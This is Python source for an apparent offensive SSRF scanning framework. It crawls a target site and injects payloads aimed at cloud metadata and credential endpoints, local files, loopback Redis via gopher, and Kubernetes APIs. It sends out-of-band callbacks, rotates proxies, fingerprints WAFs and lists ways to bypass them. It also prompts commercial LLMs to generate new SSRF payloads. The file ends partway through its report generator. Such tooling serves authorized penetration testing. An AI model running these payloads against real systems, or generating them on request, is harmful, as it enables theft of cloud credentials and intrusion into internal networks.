#!/usr/bin/env python3
import asyncio, json, random, re, urllib.parse, os, sys, socket, argparse
from dataclasses import dataclass, asdict
from datetime import datetime
from typing import List, Dict, Optional, Set, Tuple
from collections import defaultdict
from pathlib import Path
from playwright.async_api import async_playwright, Response, Page

try:
    import aiohttp
    AIOHTTP_AVAILABLE = True
except ImportError:
    AIOHTTP_AVAILABLE = False

try:
    from jinja2 import Template
    JINJA2_AVAILABLE = True
except ImportError:
    JINJA2_AVAILABLE = False

try:
    import yaml
    YAML_AVAILABLE = True
except ImportError:
    YAML_AVAILABLE = False

try:
    import networkx as nx
    NETWORKX_AVAILABLE = True
except ImportError:
    NETWORKX_AVAILABLE = False

RED = "\033[91m"; GREEN = "\033[92m"; YELLOW = "\033[93m"; BLUE = "\033[94m"
MAGENTA = "\033[95m"; CYAN = "\033[96m"; PURPLE = "\033[35m"; BOLD = "\033[1m"; DIM = "\033[2m"
RESET = "\033[0m"; OK = f"{GREEN}[OK]{RESET}"; WARN = f"{YELLOW}[!]{RESET}"; FAIL = f"{RED}[X]{RESET}"
AI_ICON = f"{PURPLE}[AI]{RESET}"

BANNER = f"""
{BOLD}{CYAN}
╔════════════════════════════════════════════════════════════════╗
║              ULTIMATE SSRF FRAMEWORK v4.2-experimental         ║
║     github.com/KauanCosta2000/Ultimate-ssrf-Framework          ║
║              Created by belladonnask                           ║
╚════════════════════════════════════════════════════════════════╝
{RESET}"""

@dataclass
class SSRFEvidence:
    phase: str; technique: str; url: str; endpoint: str; param: str
    payload: str; status: int; body_snippet: str; matched_patterns: List[str]
    severity: str = "info"; request_headers: Optional[Dict] = None
    response_headers: Optional[Dict] = None; out_of_band_hit: bool = False
    impact_score: float = 0.0

@dataclass
class DiscoveredEndpoint:
    path: str; method: str; params: Set[str]
    accepts_url_param: bool; test_response_code: int; content_type: str

def setup_argparse():
    parser = argparse.ArgumentParser(description="Ultimate SSRF Framework v4.2-experimental",
                                     formatter_class=argparse.RawDescriptionHelpFormatter)
    target_group = parser.add_mutually_exclusive_group()
    target_group.add_argument("--target", "-t", help="Single target domain")
    target_group.add_argument("--targets", help="Comma-separated targets")
    target_group.add_argument("--target-file", "-f", help="File with targets (one per line)")
    parser.add_argument("--callback", "-c", help="OOB callback host")
    parser.add_argument("--collaborator", help="OAST-compatible callback host (alias for --callback)")
    parser.add_argument("--burp-collaborator", help="Burp Collaborator host")
    parser.add_argument("--delay", "-d", type=float, default=0.5)
    parser.add_argument("--quiet", "-q", action="store_true")
    parser.add_argument("--visible", action="store_true")
    proxy_group = parser.add_argument_group("Proxy Support")
    proxy_group.add_argument("--proxy", "-p", help="Single proxy URL (used for the entire scan)")
    proxy_group.add_argument("--proxy-file", help="File with proxy list (one proxy per scan)")
    proxy_group.add_argument("--proxy-type", choices=["http","socks5"], default="http")
    ai_group = parser.add_argument_group("AI Integration (Optional)")
    ai_group.add_argument("--ai-provider", choices=["claude","openai","ollama","gemini","mistral","deepseek","none"])
    ai_group.add_argument("--ai-key", help="API key for cloud AI")
    ai_group.add_argument("--ai-model", help="Specific model name")
    feature_group = parser.add_argument_group("Feature Control")
    feature_group.add_argument("--no-waf", action="store_true", help="Disable WAF detection")
    feature_group.add_argument("--no-websocket", action="store_true", help="Disable WebSocket SSRF tests")
    feature_group.add_argument("--no-grpc", action="store_true", help="Disable gRPC SSRF tests")
    feature_group.add_argument("--no-k8s", action="store_true", help="Disable Kubernetes SSRF tests")
    feature_group.add_argument("--no-serverless", action="store_true", help="Disable serverless SSRF tests")
    feature_group.add_argument("--no-ai", action="store_true", help="Disable AI features")
    export_group = parser.add_argument_group("Export Options (experimental)")
    export_group.add_argument("--export-nuclei", action="store_true", help="Export Nuclei templates (YAML if PyYAML installed)")
    export_group.add_argument("--export-siem", action="store_true", help="Export CEF for SIEM")
    export_group.add_argument("--export-json-api", action="store_true", help="Export JSON API report")
    export_group.add_argument("--attack-map", action="store_true", help="Generate attack path graph (requires networkx)")
    export_group.add_argument("--output", "-o", default=".", help="Output directory")
    return parser

class TargetManager:
    @staticmethod
    def from_args(args) -> List[str]:
        if args.target:
            c = TargetManager._clean(args.target)
            return [c] if c else []
        if args.targets:
            return [d for d in (TargetManager._clean(x) for x in args.targets.split(',')) if d]
        if args.target_file:
            return TargetManager._from_file(args.target_file)
        return []

    @staticmethod
    def _clean(domain: str) -> Optional[str]:
        d = domain.strip()
        if not d: return None
        d = re.sub(r'^https?://', '', d).split('/')[0]
        return d

    @staticmethod
    def _from_file(path: str) -> List[str]:
        targets = []
        try:
            with open(path) as f:
                for line in f:
                    line = line.strip()
                    if line and not line.startswith('#'):
                        c = TargetManager._clean(line)
                        if c: targets.append(c)
        except Exception as e:
            print(f"{FAIL} Error reading target file '{path}': {e}")
            sys.exit(1)
        return targets

    @staticmethod
    def interactive() -> List[str]:
        print(f"\n{BOLD}{CYAN}TARGET SELECTION{RESET}")
        print(f"  1 - Single domain")
        print(f"  2 - Multiple (comma)")
        print(f"  3 - File")
        while True:
            ch = input(f"{WARN} Choose [1/2/3]: ").strip()
            if ch == "1":
                t = [TargetManager._clean(input("Domain: "))]
                return [x for x in t if x]
            if ch == "2":
                doms = input("Domains (comma): ")
                return [d for d in (TargetManager._clean(x) for x in doms.split(',')) if d]
            if ch == "3":
                return TargetManager._from_file(input("File path: ").strip())
            print(f"{FAIL} Invalid option")

class ProxyManager:
    def __init__(self, proxy_list: List[str] = None, proxy_type: str = "http"):
        self.list = proxy_list or []
        self.ptype = proxy_type
        self.idx = 0
        self.lock = asyncio.Lock()

    @classmethod
    def from_file(cls, path: str, ptype="http") -> "ProxyManager":
        proxies = []
        try:
            with open(path) as f:
                for line in f:
                    line = line.strip()
                    if line and not line.startswith('#'):
                        proxies.append(line)
        except Exception as e:
            print(f"{FAIL} Error reading proxy file '{path}': {e}")
            sys.exit(1)
        return cls(proxies, ptype)

    async def pick(self) -> Optional[str]:
        if not self.list: return None
        async with self.lock:
            p = self.list[self.idx % len(self.list)]
            self.idx += 1
            return p

class LLMClient:
    MODELS = {
        "claude": "claude-3-5-sonnet-20241022",
        "openai": "gpt-4o",
        "ollama": "llama3.1:latest",
        "gemini": "gemini-2.0-flash-exp",
        "mistral": "mistral-large-latest",
        "deepseek": "deepseek-chat",
    }
    def __init__(self, provider=None, api_key=None, model=None):
        self.provider = provider
        self.api_key = api_key
        self.model = model or self.MODELS.get(provider)
        self.enabled = False
        if not provider or provider == "none" or not AIOHTTP_AVAILABLE:
            return
        if provider == "ollama":
            try:
                s = socket.socket(); s.settimeout(1); s.connect(('localhost',11434)); s.close()
                self.enabled = True
            except:
                print(f"{WARN} Ollama not reachable")
        elif api_key:
            self.enabled = True
        else:
            print(f"{WARN} No API key for {provider}")

    async def generate(self, sys_msg: str, usr_msg: str) -> Optional[str]:
        if not self.enabled: return None
        try:
            if self.provider == "claude":
                return await self._claude(sys_msg, usr_msg)
            if self.provider == "gemini":
                return await self._gemini(sys_msg, usr_msg)
            if self.provider == "ollama":
                return await self._ollama(sys_msg, usr_msg)
            return await self._openai_compat(sys_msg, usr_msg)
        except Exception as e:
            print(f"{WARN} LLM error: {e}")
            return None

    async def _claude(self, sys_msg, usr_msg):
        headers = {"x-api-key": self.api_key, "anthropic-version": "2023-06-01", "content-type": "application/json"}
        body = {"model": self.model, "max_tokens": 4096, "system": sys_msg, "messages": [{"role":"user","content":usr_msg}]}
        async with aiohttp.ClientSession() as s:
            async with s.post("https://api.anthropic.com/v1/messages", headers=headers, json=body, timeout=60) as r:
                data = await r.json()
                return data.get("content",[{}])[0].get("text","")

    async def _openai_compat(self, sys_msg, usr_msg):
        urls = {"openai":"https://api.openai.com/v1/chat/completions",
                "mistral":"https://api.mistral.ai/v1/chat/completions",
                "deepseek":"https://api.deepseek.com/v1/chat/completions"}
        headers = {"Authorization": f"Bearer {self.api_key}", "Content-Type": "application/json"}
        body = {"model": self.model, "messages": [{"role":"system","content":sys_msg},{"role":"user","content":usr_msg}], "max_tokens":4096}
        url = urls.get(self.provider, urls["openai"])
        async with aiohttp.ClientSession() as s:
            async with s.post(url, headers=headers, json=body, timeout=60) as r:
                data = await r.json()
                return data.get("choices",[{}])[0].get("message",{}).get("content","")

    async def _gemini(self, sys_msg, usr_msg):
        url = f"https://generativelanguage.googleapis.com/v1beta/models/{self.model}:generateContent?key={self.api_key}"
        body = {"contents":[{"parts":[{"text":f"{sys_msg}\n\n{usr_msg}"}]}]}
        async with aiohttp.ClientSession() as s:
            async with s.post(url, json=body, timeout=60) as r:
                data = await r.json()
                return data.get("candidates",[{}])[0].get("content",{}).get("parts",[{}])[0].get("text","")

    async def _ollama(self, sys_msg, usr_msg):
        body = {"model": self.model, "prompt": f"System: {sys_msg}\n\nUser: {usr_msg}\n\nAssistant:", "stream": False}
        async with aiohttp.ClientSession() as s:
            async with s.post("http://localhost:11434/api/generate", json=body, timeout=120) as r:
                data = await r.json()
                return data.get("response","")

class AISkills:
    def __init__(self, llm):
        self.llm = llm
        self.enabled = llm and llm.enabled

    async def generate_payloads(self, context: dict) -> List[str]:
        sys = "You are an SSRF expert. Generate 10 diverse SSRF payloads for the target. Return JSON array of strings."
        usr = f"Target: {context.get('target')}\nWAF: {context.get('waf','none')}\nCloud: {context.get('cloud','unknown')}\nEndpoints: {json.dumps(context.get('endpoints',[]))}"
        resp = await self.llm.generate(sys, usr)
        if resp:
            try:
                match = re.search(r'\[.*\]', resp, re.DOTALL)
                if match:
                    return json.loads(match.group())
            except:
                pass
        return [
            f"http://127.0.0.1/", f"http://169.254.169.254/latest/meta-data/",
            f"http://metadata.google.internal/", f"file:///etc/passwd",
            f"gopher://127.0.0.1:6379/_INFO", f"http://0x7f000001/",
            f"http://2130706433/", f"http://[::1]/", f"http://127.0.0.1.nip.io/"
        ]

    async def triage(self, findings: List[dict]) -> Optional[str]:
        sys = "You are a senior security analyst. Provide a concise triage summary: most critical finding, overall risk, recommended next steps."
        usr = json.dumps(findings[:5], indent=2)
        return await self.llm.generate(sys, usr)

class WAFFingerprinter:
    SIGNATURES = {
        "Cloudflare": {"headers":["cf-ray","__cfduid"],"cookies":["__cfduid","cf_clearance"],"body":["cloudflare"]},
        "AWS WAF": {"headers":["x-amz-cf-id","x-amzn-requestid"],"cookies":[],"body":["request blocked"]},
        "Akamai": {"headers":["x-akamai-transformed"],"cookies":["ak_bmsc"],"body":["akamai"]},
        "Imperva": {"headers":["x-cdn","x-iinfo"],"cookies":["incap_ses_","visid_incap_"],"body":["incapsula"]},
        "F5 BIG-IP": {"headers":["x-wa-info"],"cookies":["f5avr"],"body":["f5 networks"]},
        "Sucuri": {"headers":["x-sucuri-id"],"cookies":["sucuri_cloudproxy_uuid"],"body":["sucuri"]},
        "Fastly": {"headers":["fastly-debug-digest","x-served-by"],"cookies":[],"body":["fastly"]},
        "Azure Front Door": {"headers":["x-azure-ref","x-ms-request-id"],"cookies":[],"body":["azure"]},
        "Google Cloud Armor": {"headers":[],"cookies":[],"body":["google cloud armor"]},
        "FortiWeb": {"headers":[],"cookies":["fortiwafsid"],"body":["fortiweb"]},
    }
    BYPASS = {
        "Cloudflare":["DNS rebinding","IPv6 notation"],
        "AWS WAF":["IMDSv1 downgrade","Alternative metadata IPs"],
        "Imperva":["Double URL encoding","gopher:// protocol"],
        "Akamai":["Origin IP discovery","DNS pinning"],
    }
    def fingerprint(self, headers, body, cookies=None):
        cookies = cookies or {}
        headers_lower = {k.lower(): str(v).lower() for k,v in headers.items()}
        body_lower = body.lower()[:10000]
        cookie_keys = [k.lower() for k in cookies]
        results = {}
        for waf, sigs in self.SIGNATURES.items():
            score = 0; max_score = 0
            for h in sigs["headers"]:
                max_score += 2
                if any(h.lower() in hk for hk in headers_lower): score += 2
            for c in sigs["cookies"]:
                max_score += 2
                if any(c.lower() in ck for ck in cookie_keys): score += 2
            for b in sigs["body"]:
                max_score += 1
                if b in body_lower: score += 1
            if max_score > 0:
                confidence = (score/max_score)*100
                if confidence >= 20: results[waf] = confidence
        sorted_results = sorted(results.items(), key=lambda x: x[1], reverse=True)
        if sorted_results:
            return {"detected":True,"primary":sorted_results[0][0],"confidence":sorted_results[0][1],
                    "all_matches":dict(sorted_results[:3]),
                    "bypass_suggestions":self.BYPASS.get(sorted_results[0][0],[])}
        return {"detected":False,"primary":None,"confidence":0}

class UltimateSSRFFramework:
    def __init__(self, target, args):
        self.target = target
        self.base = f"https://{target}" if not target.startswith("http") else target
        self.cb = (
            args.callback
            or args.collaborator
            or args.burp_collaborator
            or f"{target}.ssrf-test.local"
        )
        self.delay = args.delay
        self.verbose = not args.quiet
        self.headless = not args.visible
        self.proxy = args.proxy
        self.proxy_file = args.proxy_file
        self.proxy_type = args.proxy_type
        self.no_waf = args.no_waf
        self.no_ws = args.no_websocket
        self.no_grpc = args.no_grpc
        self.no_k8s = args.no_k8s
        self.no_serverless = args.no_serverless
        self.no_ai = args.no_ai
        self.do_export_nuclei = args.export_nuclei
        self.do_export_siem = args.export_siem
        self.do_export_json_api = args.export_json_api
        self.do_attack_map = args.attack_map

        self.output_dir = Path(args.output)
        self.output_dir.mkdir(parents=True, exist_ok=True)

        self.llm = None; self.ai = None
        if args.ai_provider and args.ai_provider != "none" and not self.no_ai:
            self.llm = LLMClient(args.ai_provider, args.ai_key, args.ai_model)
            if self.llm.enabled: self.ai = AISkills(self.llm)

        self.evidence: List[SSRFEvidence] = []
        self.endpoints: List[DiscoveredEndpoint] = []
        self.params: Set[str] = set()
        self.callbacks = defaultdict(list)
        self.waf_info = {}
        self.cloud = []
        self.internal_ips = set()

        self.proxy_mgr = None
        if args.proxy_file:
            self.proxy_mgr = ProxyManager.from_file(args.proxy_file, args.proxy_type)
        elif args.proxy:
            self.proxy_mgr = ProxyManager([args.proxy], args.proxy_type)

        self.waf = WAFFingerprinter()
        self.playwright = None; self.browser = None; self.page = None
        self.sem = asyncio.Semaphore(15)

        safe = re.sub(r'[^a-zA-Z0-9.-]', '_', target)
        ts = datetime.now().strftime('%Y%m%d_%H%M%S')
        self.json_file = self.output_dir / f"ssrf_{safe}_{ts}.json"
        self.html_file = self.output_dir / f"ssrf_report_{safe}_{ts}.html"

    async def start(self):
        self.playwright = await async_playwright().start()
        launch_opts = {"headless": self.headless}
        if self.proxy_mgr:
            p = await self.proxy_mgr.pick()
            if p:
                launch_opts["proxy"] = {"server": p}
                if self.verbose: print(f"{CYAN}[PROXY]{RESET} {p}")
        self.browser = await self.playwright.chromium.launch(**launch_opts)
        ctx = await self.browser.new_context(user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
        await ctx.route("**/*", self._intercept)
        self.page = await ctx.new_page()

    async def stop(self):
        if self.browser: await self.browser.close()
        if self.playwright: await self.playwright.stop()

    async def _intercept(self, route):
        req = route.request
        url = req.url
        if self.cb and self.cb in url:
            ev = SSRFEvidence(phase="BLIND_SSRF", technique="OOB Callback",
                              url=url, endpoint="", param="", payload=url,
                              status=200, body_snippet="", matched_patterns=["[CRITICAL] Blind SSRF confirmed"],
                              severity="critical", out_of_band_hit=True)
            self.evidence.append(ev)
            self.callbacks[url].append({"time": datetime.now().isoformat(), "method": req.method})
        await route.continue_()

    async def request(self, method, url, data=None, headers=None, timeout=15000):
        async with self.sem:
            try:
                safe_url = json.dumps(url)
                if method.upper() == "GET":
                    resp = await self.page.goto(url, wait_until="domcontentloaded", timeout=timeout)
                    status = resp.status if resp else 0
                    body = await resp.text() if resp else ""
                    hdrs = dict(resp.headers) if resp else {}
                else:
                    js = f"""
                    (async () => {{
                        const r = await fetch({safe_url}, {{
                            method: '{method}',
                            headers: {json.dumps(headers or {})},
                            body: {json.dumps(json.dumps(data) if data else "")}
                        }});
                        return {{ status: r.status, body: await r.text(), headers: Object.fromEntries(r.headers) }};
                    }})();
                    """
                    result = await self.page.evaluate(js)
                    status = result.get("status", 0)
                    body = result.get("body", "")
                    hdrs = result.get("headers", {})
                await asyncio.sleep(self.delay)
                return status, body, hdrs
            except:
                return 0, "", {}

    async def check_evidence(self, phase, technique, url, endpoint, param, payload, status, body, headers):
        patterns = [
            (r'root:[^:]+:[0-9]+:[0-9]+:', '/etc/passwd', 'critical'),
            (r'AKIA[0-9A-Z]{16}', 'AWS key', 'critical'),
            (r'computeMetadata|metadata\.google\.internal', 'Cloud metadata', 'high'),
            (r'169\.254\.\d{1,3}\.\d{1,3}', 'Cloud metadata IP', 'high'),
            (r'10\.\d{1,3}\.\d{1,3}\.\d{1,3}', 'Internal IP', 'high'),
            (r'192\.168\.\d{1,3}\.\d{1,3}', 'Internal IP', 'high'),
        ]
        matched = []
        combined = (body + json.dumps(headers)).lower()
        for pat, desc, sev in patterns:
            if re.search(pat, combined, re.I):
                matched.append(f"[{sev.upper()}] {desc}")
        if self.cb and self.cb in body:
            matched.append("[CRITICAL] Callback in response")
        if matched:
            sev_order = {"CRITICAL":0,"HIGH":1,"MEDIUM":2,"LOW":3}
            sev = min(sev_order.get(p.split("]")[0].replace("[",""),3) for p in matched)
            sev_map = {0:"critical",1:"high",2:"medium",3:"low"}
            ev = SSRFEvidence(phase=phase, technique=technique, url=url, endpoint=endpoint, param=param,
                              payload=payload, status=status, body_snippet=body[:300],
                              matched_patterns=matched, severity=sev_map.get(sev,"info"))
            ev.impact_score = self._impact(ev)
            self.evidence.append(ev)
            ips = re.findall(r'(10\.\d{1,3}\.\d{1,3}\.\d{1,3}|172\.(1[6-9]|2[0-9]|3[0-1])\.\d{1,3}\.\d{1,3}|192\.168\.\d{1,3}\.\d{1,3})', body)
            for ip in ips: self.internal_ips.add(ip[0])
            return [ev]
        return []

    def _impact(self, ev):
        score = 0.0
        if ev.out_of_band_hit: score += 3
        if any("token" in p.lower() for p in ev.matched_patterns): score += 4
        elif any("metadata" in p.lower() for p in ev.matched_patterns): score += 2
        if re.search(r'(10\.|172\.(1[6-9]|2[0-9]|3[0-1])|192\.168\.)', ev.url): score += 3
        return min(score, 10.0)

    async def test_payload(self, ep, param, payload, phase, technique):
        if ep.method == "GET":
            sep = "&" if "?" in ep.path else "?"
            url = f"{self.base}{ep.path}{sep}{param}={urllib.parse.quote(payload)}"
            s, b, h = await self.request("GET", url)
        else:
            url = f"{self.base}{ep.path}"
            s, b, h = await self.request("POST", url, {param: payload})
        findings = await self.check_evidence(phase, technique, url, ep.path, param, payload, s, b, h)
        if findings and self.verbose:
            for f in findings:
                col = {"critical":RED,"high":YELLOW,"medium":MAGENTA}.get(f.severity, BLUE)
                print(f"  {col}[{f.severity.upper()}]{RESET} {ep.path} → {param} (impact {f.impact_score:.1f})")
        return bool(findings)

    async def discover(self):
        if self.verbose: print(f"\n{CYAN}[DISCOVERY]{RESET} Crawling and extracting endpoints...")
        static_paths = ["/","/api","/proxy","/fetch","/graphql","/health","/ws","/socket","/grpc","/k8s"]
        crawled_paths = set(static_paths)
        try:
            await self.page.goto(self.base, wait_until="networkidle", timeout=20000)
            extracted = await self.page.evaluate("""() => {
                const paths = new Set();
                document.querySelectorAll('a[href]').forEach(a => {
                    try {
                        const u = new URL(a.href, document.baseURI);
                        if (u.origin === document.location.origin) paths.add(u.pathname + u.search);
                    } catch(e) {}
                });
                document.querySelectorAll('form[action]').forEach(f => {
                    try {
                        const u = new URL(f.action, document.baseURI);
                        if (u.origin === document.location.origin) paths.add(u.pathname);
                    } catch(e) {}
                });
                document.querySelectorAll('script[src]').forEach(s => {
                    try {
                        const u = new URL(s.src, document.baseURI);
                        if (u.origin === document.location.origin) paths.add(u.pathname);
                    } catch(e) {}
                });
                document.querySelectorAll('iframe[src]').forEach(i => {
                    try {
                        const u = new URL(i.src, document.baseURI);
                        if (u.origin === document.location.origin) paths.add(u.pathname);
                    } catch(e) {}
                });
                return Array.from(paths).slice(0, 50);
            }""")
            crawled_paths.update(extracted)
        except Exception as e:
            if self.verbose: print(f"  {WARN} Crawling error: {e}")
        for p in crawled_paths:
            try:
                url = f"{self.base}{p}"
                s, b, h = await self.request("GET", url, timeout=8000)
                if s not in (0,404,403):
                    params = set(re.findall(r'[?&]([a-zA-Z_]\w*)=', p))
                    params.update(re.findall(r'name=["\']([^"\']+)["\']', b, re.I))
                    ep = DiscoveredEndpoint(path=p, method="GET", params=params,
                                            accepts_url_param=True, test_response_code=s,
                                            content_type=h.get("content-type",""))
                    self.endpoints.append(ep)
                    if self.verbose and s != 200: print(f"  {DIM}[{s}]{RESET} {p}")
            except: pass
        if self.verbose: print(f"  {OK} Found {len(self.endpoints)} endpoints")

    async def detect_cloud(self):
        if self.verbose: print(f"\n{CYAN}[CLOUD]{RESET} Detecting cloud provider...")
        s, b, h = await self.request("GET", self.base)
        body_low = b.lower()
        indicators = {"AWS":["x-amz-request-id","ec2"],"GCP":["x-goog-","metadata.google.internal"],
                      "Azure":["x-ms-request-id"],"Alibaba":["aliyungf"]}
        self.cloud = [c for c, pats in indicators.items() if any(p in body_low or p in str(h).lower() for p in pats)]
        if self.verbose:
            if self.cloud: print(f"  {YELLOW}{', '.join(self.cloud)}{RESET}")
            else: print(f"  {OK} No specific cloud detected")

    def make_callback_url(self, tag: str = "ssrf", scheme: str = "http") -> str:
        host = self.cb.replace("https://", "").replace("http://", "").strip("/")
        token = random.randint(100000, 999999)
        return f"{scheme}://{tag}-{token}.{host}"

    async def basic(self):
        if self.verbose: print(f"\n{CYAN}[BASIC]{RESET} Testing common SSRF parameters...")
        for ep in self.endpoints[:5]:
            for param in ["url","uri","file","path","redirect"]:
                payload = self.make_callback_url("basic")
                await self.test_payload(ep, param, payload, "Basic", f"param {param}")

    async def run_ai_phases(self):
        if not self.ai or not self.ai.enabled: return
        if self.verbose: print(f"\n{PURPLE}[AI PHASES]{RESET} AI-powered analysis...")
        context = {"target":self.target,"waf":self.waf_info.get("primary",""),
                   "cloud":",".join(self.cloud),"endpoints":[e.path for e in self.endpoints[:5]]}
        payloads = await self.ai.generate_payloads(context)
        if payloads and self.verbose: print(f"  {AI_ICON} Generated {len(payloads)} custom payloads")
        if self.endpoints and payloads:
            ep = self.endpoints[0]
            param = list(ep.params)[0] if ep.params else "url"
            for pl in payloads[:5]:
                await self.test_payload(ep, param, pl, "AI-Generated", "AI Payload")
        if self.evidence:
            summary_data = [{"endpoint":ev.endpoint,"param":ev.param,"severity":ev.severity,"patterns":ev.matched_patterns[:2]} for ev in self.evidence[:10]]
            triage = await self.ai.triage(summary_data)
            if triage and self.verbose: print(f"  {AI_ICON} AI Triage:\n    {triage[:200]}...")

    async def phase_websocket(self):
        if self.no_ws: return
        if self.verbose: print(f"\n{PURPLE}[WebSocket SSRF (exp)]{RESET} Testing...")
        for ep in self.endpoints:
            if "ws" in ep.path.lower() or "socket" in ep.path.lower():
                for param in list(ep.params)[:3] + ["url"]:
                    payload = self.make_callback_url("ws", scheme="wss")
                    await self.test_payload(ep, param, payload, "WebSocket", f"WS via {param}")

    async def phase_grpc(self):
        if self.no_grpc or not AIOHTTP_AVAILABLE: return
        if self.verbose: print(f"\n{PURPLE}[gRPC SSRF (exp)]{RESET} Probing gRPC...")
        urls = ["/grpc.reflection.v1alpha.ServerReflection/ServerReflectionInfo",
                "/grpc.reflection.v1.ServerReflection/ServerReflectionInfo",
                "/grpc.health.v1.Health/Check"]
        old_count = len(self.callbacks)
        for path in urls:
            full_url = f"{self.base}{path}"
            try:
                async with aiohttp.ClientSession() as session:
                    headers = {"Content-Type":"application/grpc","X-SSRF": self.make_callback_url("grpc")}
                    resp = await session.post(full_url, headers=headers, timeout=10)
                    body = await resp.text()
                    if any(kw in body.lower() for kw in ["metadata","token","access_key"]):
                        ev = SSRFEvidence(phase="gRPC SSRF", technique="gRPC Response",
                                          url=full_url, endpoint=path, param="header", payload="X-SSRF",
                                          status=resp.status, body_snippet=body[:200],
                                          matched_patterns=["[HIGH] gRPC endpoint returned sensitive data"],
                                          severity="high")
                        self.evidence.append(ev)
            except: pass
        new_callbacks = len(self.callbacks) - old_count
        if new_callbacks > 0:
            print(f"  {RED}[!] gRPC triggered {new_callbacks} callback(s){RESET}")
            ev = SSRFEvidence(phase="gRPC SSRF", technique="Header Injection",
                              url=full_url, endpoint="/grpc", param="header", payload="X-SSRF",
                              status=0, body_snippet="",
                              matched_patterns=["[CRITICAL] Blind SSRF via gRPC"],
                              severity="critical", out_of_band_hit=True)
            self.evidence.append(ev)
        else:
            if self.verbose: print(f"  {DIM}No callbacks detected{RESET}")

    async def phase_k8s(self):
        if self.no_k8s: return
        if self.verbose: print(f"\n{PURPLE}[K8s SSRF (exp)]{RESET} Testing...")
        urls = ["https://kubernetes.default.svc/api/v1/namespaces",
                "https://kubernetes.default.svc/apis/apps/v1/deployments",
                "http://169.254.169.254/latest/meta-data/"]
        for ep in self.endpoints[:5]:
            for param in list(ep.params)[:3] + ["url"]:
                for u in urls:
                    await self.test_payload(ep, param, u, "K8s SSRF", f"Targeting {u}")

    async def phase_serverless(self):
        if self.no_serverless: return
        if self.verbose: print(f"\n{PURPLE}[Serverless SSRF (exp)]{RESET} Testing...")
        targets = {"AWS Lambda":["http://169.254.170.2/v1/credentials"],
                   "Azure Functions":["http://169.254.169.254/metadata/identity/oauth2/token"],
                   "GCP Functions":["http://metadata.google.internal/"]}
        for ep in self.endpoints[:5]:
            for param in list(ep.params)[:3] + ["url"]:
                for cloud, urls in targets.items():
                    for u in urls:
                        await self.test_payload(ep, param, u, "Serverless", f"{cloud}: {u}")

    def _dedup(self):
        groups = defaultdict(lambda: {"findings":[], "max_sev":"info", "oob":0})
        sev_order = {"critical":0,"high":1,"medium":2,"low":3,"info":4}
        for f in self.evidence:
            key = (f.endpoint, f.param)
            groups[key]["findings"].append(f)
            if sev_order.get(f.severity,4) < sev_order.get(groups[key]["max_sev"],4):
                groups[key]["max_sev"] = f.severity
            if f.out_of_band_hit: groups[key]["oob"] += 1
        return dict(groups)

    def export_nuclei(self):
        if not self.do_export_nuclei: return
        templates = []
        for ev in self.evidence:
            if ev.out_of_band_hit:
                tid = f"ssrf-{ev.endpoint.replace('/','-')}-{ev.param}"
                templates.append({
                    "id": tid,
                    "info": {"name":f"SSRF on {ev.endpoint}","severity":ev.severity},
                    "requests":[{"method":"GET",
                                 "path":[f"{{{{BaseURL}}}}{ev.endpoint}?{ev.param}={{{{url}}}}"],
                                 "matchers":[{"type":"word","words":["callback"]}]}]
                })
        if templates:
            if YAML_AVAILABLE:
                with open(self.output_dir / f"nuclei_{self.target}.yaml", "w") as f:
                    yaml.dump(templates, f, allow_unicode=True)
                print(f"  {OK} Nuclei YAML exported")
            else:
                with open(self.output_dir / f"nuclei_{self.target}.json", "w") as f:
                    json.dump(templates, f, indent=2)
                print(f"  {WARN} PyYAML missing, exported JSON")

    def export_siem_cef(self):
        if not self.do_export_siem: return
        entries = []
        for ev in self.evidence:
            cef = f"CEF:0|SSRFFramework|4.2|{ev.severity}|SSRF|{ev.severity}|"
            cef += f"endpoint={ev.endpoint} param={ev.param} outOfBand={ev.out_of_band_hit} score={ev.impact_score}"
            entries.append(cef)
        if entries:
            with open(self.output_dir / f"siem_{self.target}.cef", "w") as f:
                f.write("\n".join(entries))
            if self.verbose: print(f"  {OK} CEF exported")

    def export_json_api(self):
        if not self.do_export_json_api: return
        data = {
            "target": self.target,
            "timestamp": datetime.now().isoformat(),
            "cloud": self.cloud,
            "total_findings": len(self.evidence),
            "unique_findings": len(self._dedup()),
            "callbacks": len(self.callbacks)
        }
        with open(self.output_dir / f"api_report_{self.target}.json", "w") as f:
            json.dump(data, f, indent=2, default=str)
        if self.verbose: print(f"  {OK} JSON API exported")

    def generate_attack_map(self):
        if not self.do_attack_map: return
        if not NETWORKX_AVAILABLE:
            if self.verbose: print(f"{WARN} networkx missing")
            return
        G = nx.Graph()
        G.add_node(self.target, type="target")
        for ip in self.internal_ips:
            G.add_node(ip, type="internal")
            G.add_edge(self.target, ip)
        nx.write_gexf(G, self.output_dir / f"attack_map_{self.target}.gexf")
        if self.verbose: print(f"  {OK} Attack map exported")

    async def generate_html(self):
        if not JINJA2_AVAILABLE: return
        deduped = self._dedup()
        vulns = [{"endpoint":ep,"param":p,"severity":info["max_sev"],"oob":info["oob"]}
                 for (ep,p),info in deduped.items()]
        html = Template("""
<!DOCTYPE html><html><head><title>SSRF Report - {{target}}</title>
<style>body{font-family:Arial;background:#1a1a2e;color:#eee;padding:20px}
.header{background:linear-gradient(135deg,#667eea,#764ba2);padding:30px;border-radius:10px;margin-bottom:20px}
.card{background:#16213e;padding:20px;border-radius:10px;margin:10px 0}
.critical{color:#ff4444}.high{color:#ff8c00}.medium{color:#ffd700}
table{width:100%;border-collapse:collapse}th{background:#0f3460;padding:10px;text-align:left}
td{padding:8px;border-bottom:1px solid #333}
.badge{padding:4px 8px;border-radius:4px;font-size:12px}
.badge-critical{background:#ff4444}.badge-high{background:#ff8c00}.badge-medium{background:#ffd700}</style></head>
<body><div class="header"><h1>SSRF Scan Report</h1><p>Target: <strong>{{target}}</strong></p><p>Date: {{date}}</p></div>
<div class="card"><h2>Summary</h2><p>Cloud: {{cloud}}</p><p>Endpoints: {{endpoints}}</p><p>Findings: {{findings}} raw / {{unique}} unique</p><p>Callbacks: {{callbacks}}</p></div>
<div class="card"><h2>Vulnerabilities</h2><table><tr><th>Endpoint</th><th>Parameter</th><th>Severity</th><th>Callbacks</th></tr>
{% for v in vulns %}<tr><td>{{v.endpoint}}</td><td>{{v.param}}</td><td><span class="badge badge-{{v.severity}}">{{v.severity.upper()}}</span></td><td>{{v.oob}}</td></tr>{% endfor %}</table></div></body></html>
        """).render(target=self.target, date=datetime.now().strftime("%Y-%m-%d %H:%M"),
                    cloud=", ".join(self.cloud) if self.cloud else "Unknown",
                    endpoints=len(self.endpoints), findings=len(self.evidence),
